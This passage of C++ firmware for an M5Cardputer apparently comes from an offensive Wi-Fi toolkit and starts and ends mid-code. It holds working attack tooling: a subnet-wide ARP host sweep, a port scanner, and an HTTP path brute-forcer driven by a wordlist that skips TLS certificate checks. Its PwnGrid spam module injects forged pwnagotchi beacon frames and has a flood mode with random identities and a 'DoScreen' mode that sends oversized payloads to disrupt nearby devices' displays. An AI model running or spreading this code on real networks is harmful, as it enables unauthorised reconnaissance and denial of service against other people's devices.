              M5Cardputer.Display.print(" ");
              M5Cardputer.Display.setCursor(cursorX, cursorY);
            }

            if (status.enter) {
              String message = currentCommand + "\r";
              Serial.print(F("Command sent: "));
              Serial.println(message);
              ssh_channel_write(channel, message.c_str(), message.length());

              commandBuffer = "> ";
              currentCommand = "";
              cursorY += lineHeight;
              currentLine++;
              if (cursorY >= displayHeight) {
                M5Cardputer.Display.scroll(0, -lineHeight);
                cursorY = displayHeight - lineHeight;
                currentLine = totalLines - 1;
              }
              cursorX = 0;
              M5Cardputer.Display.setCursor(cursorX, cursorY);
              M5Cardputer.Display.print(commandBuffer);
            }
          }

          M5Cardputer.Display.display();
          lastKeyPressMillis = currentMillis;
        }
      }
    }

    char buffer[512];
    int nbytes = ssh_channel_read_nonblocking(channel, buffer, sizeof(buffer), 0);
    if (nbytes > 0) {
      String output = "";
      for (int i = 0; i < nbytes; ++i) {
        output += buffer[i];
      }

      output = removeANSIEscapeCodes(output);

      for (int i = 0; i < output.length(); ++i) {
        if (output[i] == '\r') {
          continue;
        } else if (output[i] == '\n') {
          cursorY += lineHeight;
          currentLine++;
          if (cursorY >= displayHeight) {
            M5Cardputer.Display.scroll(0, -lineHeight);
            cursorY = displayHeight - lineHeight;
            currentLine = totalLines - 1;
          }
          cursorX = 0;
          M5Cardputer.Display.setCursor(cursorX, cursorY);
        } else {
          M5Cardputer.Display.print(output[i]);
          cursorX += 6;
          if (cursorX >= displayWidth) {
            cursorX = 0;
            cursorY += lineHeight;
            currentLine++;
            if (cursorY >= displayHeight) {
              M5Cardputer.Display.scroll(0, -lineHeight);
              cursorY = displayHeight - lineHeight;
              currentLine = totalLines - 1;
            }
            M5Cardputer.Display.setCursor(cursorX, cursorY);
          }
        }
      }
      M5Cardputer.Display.display();

      Serial.print(F("Output received: "));
      Serial.println(output);
    }

    if (nbytes < 0 || ssh_channel_is_closed(channel)) {
      Serial.println(F("SSH channel closed or error occurred."));
      break;
    }
  }

  // Close the SSH session and free resources
  ssh_channel_close(channel);
  ssh_channel_free(channel);
  ssh_disconnect(my_ssh_session);
  ssh_free(my_ssh_session);

  vTaskDelete(NULL);
}

// connect to SSH End

/*
============================================================================================================================
// scan single IP
============================================================================================================================
*/
void scanIpPort() {
  if (WiFi.localIP().toString() == "0.0.0.0") {
    waitAndReturnToMenu("Not connected...");
    return;
  }
  M5.Display.clear();
  M5.Display.setCursor(5, 10);
  M5.Display.println("Enter IP Address:");
  M5.Display.setCursor(5, M5Cardputer.Display.height() - 20);
  M5.Display.println("Current IP:" + WiFi.localIP().toString());
  scanIp = getUserInput();

  IPAddress ip;
  if (ip.fromString(scanIp)) {
    scanPorts(ip);
  } else {
    M5.Display.clear();
    M5.Display.setCursor(5, 10);
    M5.Display.println("Invalid IP Address");
    delay(1000); // Afficher le message pendant 1 secondes

  }
  waitAndReturnToMenu("Return to menu");
}

// scan single IP end

/* 
================================================================================================================
   Web crawling
================================================================================================================ 
*/

#include <HTTPClient.h>
#include <WiFiClientSecure.h>
#include <WiFiClient.h>

// --- Constantes rÃ©glables
static const uint16_t HTTP_TIMEOUT_MS = 1200;   // Timeout en ms
static const uint8_t  MAX_REDIRECTS   = 5;      // Limite de redirections

// --- Structure URL
struct UrlPartsCrawl {
  String scheme;   // "http" | "https"
  String host;     // ipv4/host
  uint16_t port;   // 80/443/...
  String path;     // commence toujours par '/'
};

static std::vector<String> urlList;     // Liste scrollable
static int startIndex = 0;
static const int maxDisplayLines = 11;
static String urlBase = "";

// ===============================
// Helpers d'affichage
// ===============================
void displayUrls() {
  M5.Display.clear();
  M5.Display.setTextSize(1);
  M5.Display.setCursor(5, 5);

  const int total = (int)urlList.size();
  const int displayCount = std::min(maxDisplayLines, total);

  for (int i = 0; i < displayCount; ++i) {
    int displayIndex = (startIndex + i) % (total == 0 ? 1 : total);
    M5.Display.setCursor(5, 10 + i * 10);
    if (total > 0) M5.Display.println(urlList[displayIndex]);
  }

  M5.Display.setCursor(5, 5);
  M5.Display.printf(" %d-%d of %d on %s\n",
                    total == 0 ? 0 : startIndex + 1,
                    total == 0 ? 0 : startIndex + displayCount,
                    total, urlBase.c_str());
}

void addUrl(const String &url) {
  for (const auto &u : urlList) if (u == url) { displayUrls(); return; }
  urlList.push_back(url);
  if ((int)urlList.size() > maxDisplayLines) startIndex = urlList.size() - maxDisplayLines;
  displayUrls();
}

void scrollUp()   { if (startIndex > 0) { startIndex--; displayUrls(); } }
void scrollDown() { if (startIndex + maxDisplayLines < (int)urlList.size()) { startIndex++; displayUrls(); } }

// ===============================
// Parsing/Build/Resolve URL
// ===============================
inline bool isDigitCharCrawl(char c){ return (c >= '0' && c <= '9'); }

bool parseUrlCrawl(const String &inputRaw, UrlPartsCrawl &out) {
  String s = inputRaw; s.trim();

  int schemePos = s.indexOf("://");
  if (schemePos >= 0) {
    out.scheme = s.substring(0, schemePos);
    s = s.substring(schemePos + 3);
  } else {
    out.scheme = "http";
  }
  out.scheme.toLowerCase();

  String hostPort, path;
  int slashPos = s.indexOf('/');
  if (slashPos >= 0) {
    hostPort = s.substring(0, slashPos);
    path     = s.substring(slashPos);
  } else {
    hostPort = s;
    path     = "/";
  }

  int colonPos = hostPort.indexOf(':');
  if (colonPos >= 0) {
    out.host = hostPort.substring(0, colonPos);
    String portStr = hostPort.substring(colonPos + 1);
    int i = 0; while (i < (int)portStr.length() && isDigitCharCrawl(portStr[i])) i++;
    out.port = (uint16_t)portStr.substring(0, i).toInt();
  } else {
    out.host = hostPort;
    out.port = 0;
  }
  if (out.host.length() == 0) return false;

  out.path = path.length() ? path : "/";
  if (!out.path.startsWith("/")) out.path = "/" + out.path;
  if (out.port == 0) out.port = (out.scheme == "https") ? 443 : 80;

  return true;
}

String buildUrlCrawl(const UrlPartsCrawl &u) {
  bool nonDefault = (u.scheme == "http"  && u.port != 80) ||
                    (u.scheme == "https" && u.port != 443);
  String url; url.reserve(16 + u.host.length() + u.path.length());
  url  = u.scheme + "://" + u.host;
  if (nonDefault) { url += ":"; url += String(u.port); }
  url += u.path;
  return url;
}

String resolveRedirectCrawl(const UrlPartsCrawl &base, const String &locationRaw) {
  String loc = locationRaw; loc.trim();
  if (loc.length() == 0) return buildUrlCrawl(base);

  if (loc.startsWith("http://") || loc.startsWith("https://")) return loc;
  if (loc.startsWith("//")) return base.scheme + ":" + loc;

  if (loc.startsWith("/")) {
    UrlPartsCrawl u = base; u.path = loc;
    return buildUrlCrawl(u);
  }

  String baseDir = base.path;
  int lastSlash = baseDir.lastIndexOf('/');
  baseDir = (lastSlash >= 0) ? baseDir.substring(0, lastSlash + 1) : "/";

  String combined = baseDir + loc;
  while (combined.indexOf("/./") >= 0) combined.replace("/./", "/");

  int idx;
  while ((idx = combined.indexOf("/../")) > 0) {
    int prev = combined.lastIndexOf('/', idx - 1);
    if (prev >= 0) combined.remove(prev, idx - prev + 3);
    else break;
  }

  UrlPartsCrawl u = base; u.path = combined.startsWith("/") ? combined : ("/" + combined);
  return buildUrlCrawl(u);
}

// ===============================
// HTTP helpers
// ===============================
void setupHttpClientCrawl(HTTPClient &http, WiFiClient &client, WiFiClientSecure &sclient,
                          const UrlPartsCrawl &u) {
  if (u.scheme == "https") {
    sclient.setInsecure();
    http.begin(sclient, u.host, u.port, u.path, true);
  } else {
    http.begin(client, u.host, u.port, u.path);
  }
  http.setTimeout(HTTP_TIMEOUT_MS);
#if defined(HTTPCLIENT_1_1_COMPATIBLE) || defined(ESP32)
  http.setFollowRedirects(HTTPC_DISABLE_FOLLOW_REDIRECTS);
#endif
}

bool httpGetWithRedirectsCrawl(UrlPartsCrawl &url, int &lastCode) {
  WiFiClient client;
  WiFiClientSecure sclient;
  UrlPartsCrawl cur = url;

  for (uint8_t hop = 0; hop <= MAX_REDIRECTS; ++hop) {
    HTTPClient http;
    setupHttpClientCrawl(http, client, sclient, cur);
    lastCode = http.GET();
    Serial.printf("[HTTP] GET %s -> %d\n", buildUrlCrawl(cur).c_str(), lastCode);

    if (lastCode == 200) {
      http.end();
      url = cur;
      return true;
    }

    if (lastCode == 301 || lastCode == 302 || lastCode == 303 || lastCode == 307 || lastCode == 308) {
      String loc = http.getLocation();
      http.end();

      if (!confirmPopup("Redirection detected.\nFollow?\n" + loc)) return false;
      String newAbs = resolveRedirectCrawl(cur, loc);
      UrlPartsCrawl next;
      if (!parseUrlCrawl(newAbs, next)) {
        Serial.println(F("[HTTP] Invalid redirect URL"));
        return false;
      }
      cur = next;
      continue;
    }

    http.end();
    return false;
  }

  Serial.println(F("[HTTP] Too many redirects"));
  return false;
}

// ===============================
// EntrÃ©es publiques
// ===============================
void webCrawling(const IPAddress &ip) { webCrawling(ip.toString()); }

void webCrawling(const String &urlOrIp) {
  if (WiFi.localIP().toString() == "0.0.0.0") {
    waitAndReturnToMenu("Not connected...");
    return;
  }

  enterDebounce();
  startIndex = 0;
  urlList.clear();
  M5.Display.setTextColor(WHITE, BLACK);
  M5.Display.setTextSize(1);

  String inputBase = urlOrIp;
  if (inputBase.isEmpty()) {
    M5.Display.clear();
    M5.Display.setCursor(5, 10);
    M5.Display.println("Enter IP/Domain[:port]:");
    inputBase = getUserInput();
    M5.Display.setTextSize(1);
  }

  IPAddress ipTmp;
  if (ipTmp.fromString(inputBase)) {
    inputBase = "http://" + inputBase;
  } else if (!inputBase.startsWith("http://") && !inputBase.startsWith("https://")) {
    inputBase = "http://" + inputBase;
  }

  UrlPartsCrawl base;
  if (!parseUrlCrawl(inputBase, base)) {
    waitAndReturnToMenu("Invalid URL/IP");
    return;
  }

  urlBase = buildUrlCrawl(base);

  M5.Display.clear();
  M5.Display.setCursor(5, 10);
  M5.Display.println("Testing base...");
  int code = 0;
  bool ok = httpGetWithRedirectsCrawl(base, code);

  if (!ok && base.scheme == "http") {
    if (confirmPopup("HTTP failed. Try HTTPS?")) {
      base.scheme = "https"; base.port = 443; base.path = "/";
      M5.Display.clear();
      M5.Display.setCursor(5, 10);
      M5.Display.println("Testing HTTPS...");
      ok = httpGetWithRedirectsCrawl(base, code);
    }
  }

  if (!ok) {
    M5.Display.clear();
    M5.Display.setCursor(5, 10);
    M5.Display.println("URL not accessible.");
    delay(2000);
    waitAndReturnToMenu("Returning to menu...");
    return;
  }

  urlBase = buildUrlCrawl(base);
  displayUrls();

  File file = SD.open("/evil/crawler_wordlist.txt");
  if (!file) {
    M5.Display.clear();
    M5.Display.setCursor(5, 10);
    M5.Display.println("Failed open wordlist");
    delay(1200);
    waitAndReturnToMenu("Returning to menu...");
    return;
  }

  Serial.println("-------- Starting crawling on: " + urlBase);

  while (file.available()) {
    M5.update();
    M5Cardputer.update();

    String path = file.readStringUntil('\n');
    path.trim();
    if (path.length() == 0) continue;
    if (!path.startsWith("/")) path = "/" + path;

    UrlPartsCrawl probe = base;
    probe.path = path;

    M5.Display.setCursor(5, M5.Display.height() - 10);
    M5.Display.printf("On: %s                               ", path.c_str());

    int codeProbe = 0;
    bool okProbe = httpGetWithRedirectsCrawl(probe, codeProbe);

    if (okProbe) {
      addUrl(probe.path);
      Serial.println("------------------------------------ 200 : " + buildUrlCrawl(probe));
    }

    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
      M5.Display.setCursor(5, M5.Display.height() - 10);
      M5.Display.println("Crawling Stopped!      ");
      enterDebounce();
      break;
    }
  }

  file.close();

  M5.Display.setCursor(5, M5.Display.height() - 10);
  M5.Display.println("Finished Crawling!     ");

  while (true) {
    M5.update();
    M5Cardputer.update();

    if (M5Cardputer.Keyboard.isKeyPressed(';')) {
      scrollUp();
    } else if (M5Cardputer.Keyboard.isKeyPressed('.')) {
      scrollDown();
    } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) ||
               M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
      urlBase = "";
      M5.Display.setTextSize(1.5);
      waitAndReturnToMenu("Returning to menu...");
      break;
    }
    delay(100);
  }
}



/*
============================================================================================================================
// Scan des hÃ´tes
============================================================================================================================
*/
// DÃ©clarations des fonctions ARP
void read_arp_table(char * from_ip, int read_from, int read_to, std::vector<IPAddress>& hostslist);
void send_arp(char * from_ip, std::vector<IPAddress>& hostslist);

// Fonction pour enregistrer les rÃ©sultats ARP
void logARPResult(IPAddress host, bool responded) {
  char buffer[64];
  if (responded) {
    sprintf(buffer, "Host %s respond to ARP   !!!", host.toString().c_str());
  } else {
    sprintf(buffer, "Host %s silent.", host.toString().c_str());
  }
  Serial.println(buffer);
}

// Fonction pour effectuer une requÃªte ARP
bool arpRequest(IPAddress host) {
  char ipStr[16];
  sprintf(ipStr, "%s", host.toString().c_str());
  ip4_addr_t test_ip;
  ipaddr_aton(ipStr, (ip_addr_t*)&test_ip);

  struct eth_addr *eth_ret = NULL;
  const ip4_addr_t *ipaddr_ret = NULL;
  bool responded = etharp_find_addr(NULL, &test_ip, &eth_ret, &ipaddr_ret) >= 0;
  logARPResult(host, responded);
  return responded;
}


void scanHosts() {
  local_scan_setup();
  waitAndReturnToMenu("Return to menu");
}

void local_scan_setup() {
  if (WiFi.localIP().toString() == "0.0.0.0") {
    waitAndReturnToMenu("Not connected...");
    return;
  }

  enterDebounce();
  IPAddress gatewayIP;
  IPAddress subnetMask;
  std::vector<IPAddress> hostslist;
  M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
  M5.Display.setTextSize(1.5);

  gatewayIP = WiFi.gatewayIP();
  subnetMask = WiFi.subnetMask();

  IPAddress network = WiFi.localIP();
  network[3] = 0;
  M5.Display.clear();
  int numHosts = 254 - subnetMask[3];
  M5.Display.setCursor(5, M5.Display.height() / 2);
  M5.Display.println("Probing " + String(numHosts) + " hosts with ARP");
  M5.Display.println("       please wait...");

  bool foundHosts = false;
  bool stopScan = false; // Variable pour vÃ©rifier si ENTER est pressÃ©

  // PrÃ©parer l'adresse de base pour les requÃªtes ARP
  char base_ip[16];
  sprintf(base_ip, "%d.%d.%d.", network[0], network[1], network[2]);

  // Envoyer les requÃªtes ARP Ã  tout le rÃ©seau
  send_arp(base_ip, hostslist);

  // Lire la table ARP pour dÃ©tecter les hÃ´tes actifs
  read_arp_table(base_ip, 1, numHosts, hostslist);

  // Parcourir la table ARP et afficher les rÃ©sultats
  for (int i = 1; i <= numHosts; i++) {
    if (stopScan) {
      break; // Sortir de la boucle si ENTER est pressÃ©
    }

    IPAddress currentIP = network;
    currentIP[3] = i;

    if (arpRequest(currentIP)) {
      hostslist.push_back(currentIP);
      foundHosts = true;
    }
  }

  if (!foundHosts) {
    M5.Display.println("No hosts found.");
    delay(2000); // Display message for 2 seconds
    return;
  }

  displayHostOptions(hostslist);
}

// Implementation des fonctions ARP
void read_arp_table(char * from_ip, int read_from, int read_to, std::vector<IPAddress>& hostslist) {
  Serial.printf("Reading ARP table from: %d to %d\n", read_from, read_to);
  for (int i = read_from; i <= read_to; i++) {
    char test[32];
    sprintf(test, "%s%d", from_ip, i);
    ip4_addr_t test_ip;
    ipaddr_aton(test, (ip_addr_t*)&test_ip);

    const ip4_addr_t *ipaddr_ret = NULL; // Modification ici
    struct eth_addr *eth_ret = NULL;
    if (etharp_find_addr(NULL, &test_ip, &eth_ret, &ipaddr_ret) >= 0) {
      IPAddress foundIP;
      foundIP.fromString(ipaddr_ntoa((ip_addr_t*)&test_ip));
      hostslist.push_back(foundIP);
      Serial.printf("Adding found IP: %s\n", ipaddr_ntoa((ip_addr_t*)&test_ip));
    }
  }
}

void send_arp(char * from_ip, std::vector<IPAddress>& hostslist) {
  Serial.println(F("Sending ARP requests to the whole network"));
  const TickType_t xDelay = (10) / portTICK_PERIOD_MS; // DÃ©lai de 0.01 secondes
  void * netif = NULL;
  tcpip_adapter_get_netif(TCPIP_ADAPTER_IF_STA, &netif);
  struct netif *netif_interface = (struct netif *)netif;

  for (char i = 1; i < 254; i++) {
    char test[32];
    sprintf(test, "%s%d", from_ip, i);
    ip4_addr_t test_ip;
    ipaddr_aton(test, (ip_addr_t*)&test_ip);

    // Envoyer la requÃªte ARP
    int8_t arp_request_ret = etharp_request(netif_interface, &test_ip);
    vTaskDelay(xDelay); // DÃ©lai
  }
  // Lire toutes les entrÃ©es de la table ARP
  read_arp_table(from_ip, 1, 254, hostslist);
}


void displayHostOptions(const std::vector<IPAddress>& hostslist) {
  enterDebounce();
  std::vector<std::pair<std::string, std::function<void()>>> options;
  Serial.println(F("Hosts that responded to ARP:"));
  for (IPAddress ip : hostslist) {
    String txt = ip.toString();
    options.push_back({ txt.c_str(), [ = ]() {
      afterScanOptions(ip, hostslist);
    }
                      });
    Serial.println(txt);
  }

  bool scanninghost = true;
  int index = 0;
  int lineHeight = 12; // Hauteur de ligne pour chaque option 

  while (!M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
    M5.update(); // Mise Ã  jour du clavier
    M5Cardputer.update(); // Mise Ã  jour du clavier

    if (scanninghost) {
      // Clear screen
      M5.Display.clear();
      M5.Display.setCursor(5, 5);

      // Display options
      for (int i = 0; i < options.size(); ++i) {
        if (i == index) {
          M5.Display.fillRect(0, i * lineHeight, M5.Display.width(), lineHeight, menuSelectedBackgroundColor);
          M5.Display.setTextColor(menuTextFocusedColor);
        } else {
          M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
        }
        M5.Display.setCursor(5, i * lineHeight);
        M5.Display.println(options[i].first.c_str());
      }

      scanninghost = false;
    }

    // Check for user input
    if (M5Cardputer.Keyboard.isKeyPressed(';')) {
      index = (index > 0) ? index - 1 : options.size() - 1;
      scanninghost = true;
      delay(200); // Debounce delay
    }
    if (M5Cardputer.Keyboard.isKeyPressed('.')) {
      index = (index < options.size() - 1) ? index + 1 : 0;
      scanninghost = true;
      delay(200); // Debounce delay
    }
    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
      Serial.print(F("Selected option: "));
      Serial.println(options[index].first.c_str());
      options[index].second(); // Execute the function associated with the option
      break; // Exit loop after executing the selected option
    }
    if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
      return; // Exit loop after executing the selected option
    }

    delay(100); // Small delay to avoid CPU overload
  }
}

//from https://github.com/pr3y/bruce and refactored
void afterScanOptions(IPAddress ip, const std::vector<IPAddress>& hostslist) {
  enterDebounce();
  std::vector<std::pair<std::string, std::function<void()>>> option;
  option = {
    { "Scan Ports", [ = ]() {
        scanPorts(ip);
        displayHostOptions(hostslist); // Return to host options after port scan
      }
    },
    { "SSH Connect", [ = ]() {
        sshConnect(ip.toString().c_str());
        displayHostOptions(hostslist); // Return to host options after SSH connect
      }
    },
    { "Web Crawling", [ = ]() {
        webCrawling(ip);
        displayHostOptions(hostslist); // Return to host options after web crawling
      }
    },
  };

  bool scanninghost = true;
  int index = 0;
  int lineHeight = 12; // Hauteur de ligne pour chaque option

  while (1) {
    M5.update(); // Mise Ã  jour du clavier
    M5Cardputer.update(); // Mise Ã  jour du clavier

    if (scanninghost) {
      // Clear screen
      M5.Display.clear();
      M5.Display.setCursor(5, 5);

      // Display options
      for (int i = 0; i < option.size(); ++i) {
        if (i == index) {
          M5.Display.fillRect(0, i * lineHeight, M5.Display.width(), lineHeight, menuSelectedBackgroundColor);
          M5.Display.setTextColor(menuTextFocusedColor);
        } else {
          M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
        }
        M5.Display.setCursor(5, i * lineHeight);
        M5.Display.println(String(i + 1) + ". " + option[i].first.c_str());
      }

      scanninghost = false;
    }

    // Check for user input
    if (M5Cardputer.Keyboard.isKeyPressed(';')) {
      index = (index > 0) ? index - 1 : option.size() - 1;
      scanninghost = true;
      delay(200); // Debounce delay
    }
    if (M5Cardputer.Keyboard.isKeyPressed('.')) {
      index = (index < option.size() - 1) ? index + 1 : 0;
      scanninghost = true;
      delay(200); // Debounce delay
    }
    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
      Serial.print(F("Selected option: "));
      Serial.println(option[index].first.c_str());
      option[index].second(); // Execute the function associated with the option
      break; // Exit loop after executing the selected option
    }
    if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
      displayHostOptions(hostslist); // Return to host options
      return;
    }

    delay(100);
  }
  delay(200);
}


//from https://github.com/pr3y/bruce and refactored
void scanPorts(IPAddress host) {
  enterDebounce();
  WiFiClient client;
  const int ports[] = {20, 21, 22, 23, 25, 80, 137, 139, 443, 445, 3306, 3389, 8080, 8443, 9090};
  const int numPorts = sizeof(ports) / sizeof(ports[0]);
  M5.Display.clear();
  M5.Display.setTextSize(1.5);
  M5.Display.setCursor(1, 20);
  M5.Display.print("Host: " + host.toString());
  M5.Display.setCursor(1, 34);
  M5.Display.println("Ports Open: ");
  M5.Display.println("");
  for (int i = 0; i < numPorts; i++) {
    int port = ports[i];
    if (client.connect(host, port)) {
      M5.Display.print(port);
      M5.Display.print(", ");
      Serial.println("Port " + String(port) + " Open");
      client.stop();
    } else {
      M5.Display.print("*");
      M5.Display.print(", ");
    }
  }
  M5.Display.setCursor(1, M5.Display.getCursorY() + 16);
  M5.Display.print("Finished!");
  while (!M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
    M5.update();
    M5Cardputer.update();
    delay(10); // Petit dÃ©lai pour rÃ©duire la charge du processeur
  }
  enterDebounce();
}

//Scan hosts





/*
============================================================================================================================
// pwngridspam 
============================================================================================================================
*/

// Global flag to control the spam task
volatile bool spamRunning = false;
volatile bool stop_beacon = false;
volatile bool dos_pwnd = false;
volatile bool change_identity = false;

// Global arrays to hold the faces and names
const char* faces[30];  // Increase size if needed
const char* names[30];  // Increase size if needed
int num_faces = 0;
int num_names = 0;

// Forward declarations
void displaySpamStatus();
void returnToMenu();
void loadFacesAndNames();

// DÃ©finir la trame beacon brute
const uint8_t beacon_frame_template[] = {
  0x80, 0x00,                          // Frame Control
  0x00, 0x00,                          // Duration
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,  // Destination Address (Broadcast)
  0xde, 0xad, 0xbe, 0xef, 0xde, 0xad,  // Source Address (SA)
  0xde, 0xad, 0xbe, 0xef, 0xde, 0xad,  // BSSID
  0x00, 0x00,                          // Sequence/Fragment number
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Timestamp
  0x64, 0x00,  // Beacon interval
  0x11, 0x04   // Capability info
};


// Function to generate a random string that resembles a SHA-256 hash
String generate_random_identity() {
  const char hex_chars[] = "0123456789abcdef";
  String random_identity = "";
  for (int i = 0; i < 64; ++i) {
    random_identity += hex_chars[random(0, 16)];
  }
  return random_identity;
}

void send_pwnagotchi_beacon(uint8_t channel, const char* face, const char* name) {
  DynamicJsonDocument json(2048);
  json["pal"] = true;
  json["name"] = name;
  json["face"] = face; // change to {} to freeze the screen
  json["epoch"] = 1;
  json["grid_version"] = "1.10.3";
  if (change_identity) {
    json["identity"] = generate_random_identity();
  } else {
    json["identity"] = "32e9f315e92d974342c93d0fd952a914bfb4e6838953536ea6f63d54db6b9610";
  }
  json["pwnd_run"] = 0;
  json["pwnd_tot"] = 0;
  json["session_id"] = "a2:00:64:e6:0b:8b";
  json["timestamp"] = 0;
  json["uptime"] = 0;
  json["version"] = "1.8.4";
  json["policy"]["advertise"] = true;
  json["policy"]["bond_encounters_factor"] = 20000;
  json["policy"]["bored_num_epochs"] = 0;
  json["policy"]["sad_num_epochs"] = 0;
  json["policy"]["excited_num_epochs"] = 9999;

  String json_str;
  serializeJson(json, json_str);

  uint16_t json_len = json_str.length();
  uint8_t header_len = 2 + ((json_len / 255) * 2);
  uint8_t beacon_frame[sizeof(beacon_frame_template) + json_len + header_len];
  memcpy(beacon_frame, beacon_frame_template, sizeof(beacon_frame_template));

  // Ajout des donnÃ©es JSON Ã  la trame beacon
  int frame_byte = sizeof(beacon_frame_template);
  for (int i = 0; i < json_len; i++) {
    if (i == 0 || i % 255 == 0) {
      beacon_frame[frame_byte++] = 0xde;  // AC = 222
      uint8_t payload_len = 255;
      if (json_len - i < 255) {
        payload_len = json_len - i;
      }
      beacon_frame[frame_byte++] = payload_len;
    }
    beacon_frame[frame_byte++] = (uint8_t)json_str[i];
  }

  // DÃ©finir le canal et envoyer la trame
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame, sizeof(beacon_frame), false);
}

const char* pwnd_faces[] PROGMEM = {
  "NOPWND!â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– \nâ– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– "
};
const char* pwnd_names[] PROGMEM = {
  "â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– "
};

// TÃ¢che pour envoyer des trames beacon avec changement de face, de nom et de canal
void beacon_task(void* pvParameters) {
  const uint8_t channels[] = {1, 6, 11};  // Liste des canaux Wi-Fi Ã  utiliser
  const int num_channels = sizeof(channels) / sizeof(channels[0]);
  const int num_pwnd_faces = sizeof(pwnd_faces) / sizeof(pwnd_faces[0]);

  while (spamRunning) {
    if (dos_pwnd) {
      // Send PWND beacons
      for (int ch = 0; ch < num_channels; ++ch) {
        if (stop_beacon) {
          break;
        }
        send_pwnagotchi_beacon(channels[ch], pwnd_faces[0], pwnd_names[0]);
        vTaskDelay(200 / portTICK_PERIOD_MS);  // Wait 200 ms
      }
    } else {
      // Send regular beacons
      for (int i = 0; i < num_faces; ++i) {
        for (int ch = 0; ch < num_channels; ++ch) {
          if (stop_beacon) {
            break;
          }
          send_pwnagotchi_beacon(channels[ch], faces[i], names[i % num_names]);
          vTaskDelay(200 / portTICK_PERIOD_MS);  // Wait 200 ms
        }
      }
    }
  }

  vTaskDelete(NULL);
}

void displaySpamStatus() {
  enterDebounce();
  M5.Display.clear();
  M5.Display.setTextSize(1.5);
  M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
  M5.Display.setCursor(5, 10);
  M5.Display.println("PwnGrid Spam Running...");

  int current_face_index = 0;
  int current_name_index = 0;
  int current_channel_index = 0;
  const uint8_t channels[] = {1, 6, 11};
  const int num_channels = sizeof(channels) / sizeof(channels[0]);

  while (spamRunning) {
    M5.update();
    M5Cardputer.update();

    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
      spamRunning = false;
      waitAndReturnToMenu("Back to menu");
      break;
    }
    if (M5Cardputer.Keyboard.isKeyPressed('d')) {
      dos_pwnd = !dos_pwnd;
      Serial.printf("DoScreen %s.\n", dos_pwnd ? "enabled" : "disabled");
    }
    if (M5Cardputer.Keyboard.isKeyPressed('f')) {
      change_identity = !change_identity;
      Serial.printf("Change Identity %s.\n", change_identity ? "enabled" : "disabled");
    }

    // Update and display current face, name, and channel
    M5.Display.setCursor(20, 30);
    M5.Display.printf("Flood:%s", change_identity ? "1" : "0");
    M5.Display.setCursor(100, 30);
    M5.Display.printf("DoScreen:%s", dos_pwnd ? "1" : "0");
    if (!dos_pwnd) {
      M5.Display.setCursor(5, 50);
      M5.Display.printf("Face: \n%s                                              ", faces[current_face_index]);
      M5.Display.setCursor(5, 80);
      M5.Display.printf("Name:                  \n%s                                              ", names[current_name_index]);
    } else {
      M5.Display.setCursor(5, 50);
      M5.Display.printf("Face:\nNOPWND!â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– ");
      M5.Display.setCursor(5, 80);
      M5.Display.printf("Name:\nâ– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– â– ");
    }
    M5.Display.setCursor(5, 110);
    M5.Display.printf("Channel: %d  ", channels[current_channel_index]);

    // Update indices for next display
    current_face_index = (current_face_index + 1) % num_faces;
    current_name_index = (current_name_index + 1) % num_names;
    current_channel_index = (current_channel_index + 1) % num_channels;

    delay(200); // Update the display every 200 ms
  }
}


void loadFacesAndNames() {
  File file = SD.open("/evil/config/pwngridspam.txt");
  if (!file) {
    Serial.println(F("Failed to open file for reading"));
    return;
  }

  while (file.available()) {
    String line = file.readStringUntil('\n');
    if (line.startsWith("faces=")) {
      String faces_line = line.substring(6);
      faces_line.replace("\"", "");  // Remove quotes
      faces_line.trim();  // Remove leading/trailing whitespace
      faces_line.replace("\\n", "\n");  // Handle newline characters
      int start = 0;
      int end = faces_line.indexOf(',', start);
      num_faces = 0;
      while (end != -1) {
        faces[num_faces++] = strdup(faces_line.substring(start, end).c_str());
        start = end + 1;
        end = faces_line.indexOf(',', start);
      }
      faces[num_faces++] = strdup(faces_line.substring(start).c_str());
    } else if (line.startsWith("names=")) {
